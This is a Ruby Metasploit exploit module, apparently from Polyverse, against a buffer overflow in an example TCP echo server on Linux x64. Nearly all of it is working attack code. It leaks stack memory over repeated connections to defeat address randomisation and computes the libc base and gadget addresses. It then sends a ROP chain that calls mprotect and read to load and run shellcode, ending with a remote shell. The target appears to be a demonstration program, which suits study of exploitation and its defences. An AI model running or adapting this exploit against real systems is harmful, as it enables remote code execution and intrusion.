class MetasploitModule < Msf::Exploit::Remote
	Rank = ManualRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(
			update_info(
				info,
				'Name'		=> 'Polyverse tcp_echo_server example',
				'Description'	=> 'This is a module for exploiting a buffer overflow in tcp_echo_server',
				'Author'	=> 'Polyverse Corp.',
				'References'	=>
				[
					[ 'URL', 'https://polyverse.io' ],
				],
				'Platform'	=> 'linux',
				'Payload'	=> {},
				'Arch'		=> [ARCH_X64],
				'Targets'	=> 
				[
					[
						'Linux x64',
						{
							'Arch'	=> ARCH_X64,
							'Ret'	=> 0x7fffffffffff
						}
					]
				],
 				'DefaultTarget'	=> 0
			)
		)

		# Not using this right now
		register_options(
		[
			OptString.new('NOP', [true, 'NOP Byte Code (probably should get this from ARCH)', "\x90"]),
			OptInt.new('PREPAD', [true, 'Number of NOP instructions before payload', 100]), # Should be at least 16
			OptInt.new('POSTPAD', [true, 'Number of NOP instructions after payload', 100])
		])
	end

	# Returns that the remote host is always vulnerable
	def check
		print_status("def check...")
		return Exploit::CheckCode::Vulnerable
	end

	def exploit
		print_status("Start...")

		o_libc_lcsm	= 0x021e50	# __libc_start_main() offset in libc.so.6
		o_libc_mprotect	= 0x0f8550	# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep mprotect
		o_libc_read	= 0x0ef320	# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep read
		o_libc_poprdi	= 0x0f0800	# offset to gadget "pop rdi" in libc.so.6
		o_libc_poprsi	= 0x0e780b	# offset to gadget "pop rsi" in libc.so.6
		o_libc_poprdx	= 0x0c0d40	# offset to gadget "pop rdx" in libc.so.6

		o_libc_lcsmr	= 0x0000f5	# main return-to offset in __libc_start_main

		s_stack_free	= 0x10000	# save area to be putting our shellcode
		s_stack_length	= 0x23000	# estimated and not used

		# Leak the next n characters
		def probe(n, buf)
			str = ""
			for i in 1..n
				connect
				sock.write buf 
				sleep 0.5
				buf = sock.read(buf.length+1)
				disconnect
			end
			return buf[-n, n], buf.length - n, buf
		end

		# Presently, this converter assumes little-endian
		def str_to_int(str)
			n = 0
			for i in 1..str.length
				if Rex::Arch.endian(target.arch) == ENDIAN_LITTLE
					n = (n << 8) + str[str.length - i].ord
				else
					n = (n << 8) + str[i - 1].ord
				end
			end

			return n
		end

		# Formatter for binary string to hex string
		def str_to_str16(str)
			return str.unpack('H*')
		end

		# Formatter for int to hex string
		def int_to_str16(i)
			return "0x" + i.to_s(16)
		end

		# Start looking beyond the 80 byte buffer
		buf = "01234567890123456789012345678901234567890123456789012345678901234567890123456789"

		print_status("")
		print_status("VULN STACK FRAME...")

		# vuln_padding
		vuln_padding_str, vuln_padding_idx, buf = probe(12, buf)
		print_status("vuln_padding:     #{str_to_str16(vuln_padding_str)}")

		# vuln_n
		vuln_n_str, vuln_n_idx, buf = probe(4, buf)
		vuln_n = str_to_int(vuln_n_str)
		print_status("vuln_n:           #{str_to_str16(vuln_n_str)} (#{int_to_str16(vuln_n)})")

		# vuln_save_bp
		vuln_saved_bp_str, vuln_saved_bp_idx, buf = probe(8, buf)
		vuln_saved_bp = str_to_int(vuln_saved_bp_str)
		print_status("vuln_saved_bp:    #{str_to_str16(vuln_saved_bp_str)} (#{int_to_str16(vuln_saved_bp)})")

		# vuln_ret_addr
		vuln_ret_addr_str, vuln_ret_addr_idx, buf = probe(8, buf)
		vuln_ret_addr = str_to_int(vuln_ret_addr_str)
		print_status("vuln_ret_addr:    #{str_to_str16(vuln_ret_addr_str)} (#{int_to_str16(vuln_ret_addr)})")

		print_status("")
		print_status("MAIN STACK FRAME...")

		# main_argv_save
		main_argv_save_str, main_argv_save_idx, buf = probe(8, buf)
		main_argv_save = str_to_int(main_argv_save_str)
		print_status("main_argv_save:   #{str_to_str16(main_argv_save_str)} (#{int_to_str16(main_argv_save)})")

		# main_padding
		main_padding_str, main_padding_idx, buf = probe(4, buf)
		print_status("main_padding:     #{str_to_str16(main_padding_str)}")

		# main_argc_save
		main_argc_save_str, main_argc_save_idx, buf = probe(4, buf)
		main_argc_save = str_to_int(main_argc_save_str)
		print_status("main_argc_save:   #{str_to_str16(main_argc_save_str)} (#{int_to_str16(main_argc_save)})")

		# main_client_addr
		main_client_addr_str, main_client_addr_idx, buf = probe(16, buf)
		print_status("main_client_addr: #{str_to_str16(main_client_addr_str)}")

		# main_server_addr
		main_server_addr_str, main_server_addr_idx, buf = probe(16, buf)
		print_status("main_server_addr: #{str_to_str16(main_server_addr_str)}")

		# main_cli_len
		main_cli_len_str, main_cli_len_idx, buf = probe(4, buf)
		main_cli_len = str_to_int(main_cli_len_str)
		print_status("main_cli_len:     #{str_to_str16(main_cli_len_str)} (#{int_to_str16(main_cli_len)})")

		# main_client_fd
		main_client_fd_str, main_client_fd_idx, buf = probe(4, buf)
		main_client_fd = str_to_int(main_client_fd_str)
		print_status("main_client_fd:   #{str_to_str16(main_client_fd_str)} (#{int_to_str16(main_client_fd)})")

		# main_server_fd
		main_server_fd_str, main_server_fd_idx, buf = probe(4, buf)
		main_server_fd = str_to_int(main_server_fd_str)
		print_status("main_server_fd:   #{str_to_str16(main_server_fd_str)} (#{int_to_str16(main_server_fd)})")

		# main_server_port
		main_server_port_str, main_server_port_idx, buf = probe(4, buf)
		main_server_port = str_to_int(main_server_port_str)
		print_status("main_server_port: #{str_to_str16(main_server_port_str)} (#{int_to_str16(main_server_port)})")

		# The next location is mains saved frame pointer (BP)
		main_saved_bp_str, main_saved_bp_idx, buf = probe(8, buf)
		main_saved_bp = str_to_int(main_saved_bp_str)
		print_status("main_saved_bp:    #{str_to_str16(main_saved_bp_str)} (#{int_to_str16(main_saved_bp)})")

		# The next location is main callers return address (glib main)
		main_ret_addr_str, main_ret_addr_idx, buf = probe(8, buf)
		main_ret_addr = str_to_int(main_ret_addr_str)
		print_status("main_ret_addr:    #{str_to_str16(main_ret_addr_str)} (#{int_to_str16(main_ret_addr)})")

		print_status("")
		print_status("COMPUTED ADDRESSES...")

		# Calculate the location in memory where libc starts
		a_libc_base = main_ret_addr - o_libc_lcsmr - o_libc_lcsm
		print_status("a_libc_base:      #{int_to_str16(a_libc_base)}")

		# Calculate a location in the stack that's save to place our payload
		a_stack_free = (vuln_saved_bp - s_stack_free) & 0x7ffffffff000
		print_status("a_stack_free:     #{int_to_str16(a_stack_free)}")

		# Address of mprotect()
		a_libc_mprotect = a_libc_base + o_libc_mprotect
		print_status("a_libc_mprotect:  #{int_to_str16(a_libc_mprotect)}")

		# Address of read()
		a_libc_read = a_libc_base + o_libc_read
		print_status("a_libc_read:      #{int_to_str16(a_libc_read)}")

		# Address of gadget "pop rdi; ret"
		a_libc_poprdi = a_libc_base + o_libc_poprdi
		print_status("a_libc_poprdi:    #{int_to_str16(a_libc_poprdi)}")

		# Address of gadget "pop rsi; ret"
		a_libc_poprsi = a_libc_base + o_libc_poprsi
		print_status("a_libc_poprsi:    #{int_to_str16(a_libc_poprsi)}")

		# Address of gadget "pop rdx; ret"
		a_libc_poprdx = a_libc_base + o_libc_poprdx
		print_status("a_libc_poprdx:    #{int_to_str16(a_libc_poprdx)}")

       		# Start with buf up to the return address
		b = buf[0,vuln_ret_addr_idx]

		# Make the stack writable
		b += Rex::Arch.pack_addr(target.arch, a_libc_poprdi)
		b += Rex::Arch.pack_addr(target.arch, a_stack_free)
		b += Rex::Arch.pack_addr(target.arch, a_libc_poprsi)
		b += Rex::Arch.pack_addr(target.arch, s_stack_length)
		b += Rex::Arch.pack_addr(target.arch, a_libc_poprdx)
		b += Rex::Arch.pack_addr(target.arch, 0x7)
		b += Rex::Arch.pack_addr(target.arch, a_libc_mprotect)

		# Read the shellcode into the unused stack allocation
		b += Rex::Arch.pack_addr(target.arch, a_libc_poprdi)
		b += Rex::Arch.pack_addr(target.arch, main_client_fd)
		b += Rex::Arch.pack_addr(target.arch, a_libc_poprsi)
		b += Rex::Arch.pack_addr(target.arch, a_stack_free)
		b += Rex::Arch.pack_addr(target.arch, a_libc_poprdx)
		b += Rex::Arch.pack_addr(target.arch, payload.encoded.length)
		b += Rex::Arch.pack_addr(target.arch, a_libc_read)

		# Return to the shellcode that we will place at a_stack_free
		b += Rex::Arch.pack_addr(target.arch, a_stack_free)

		# This doesn't get hit. Leave it here. First attempt to recover stack
		b += Rex::Arch.pack_addr(target.arch, vuln_ret_addr)

		# Exploit
		connect
		sock.write b
		sleep 0.5
		sock.write payload.encoded
		disconnect

		print_status("")
		print_status("Done. (If successful, you should get a promptless shell.)")
	end
end
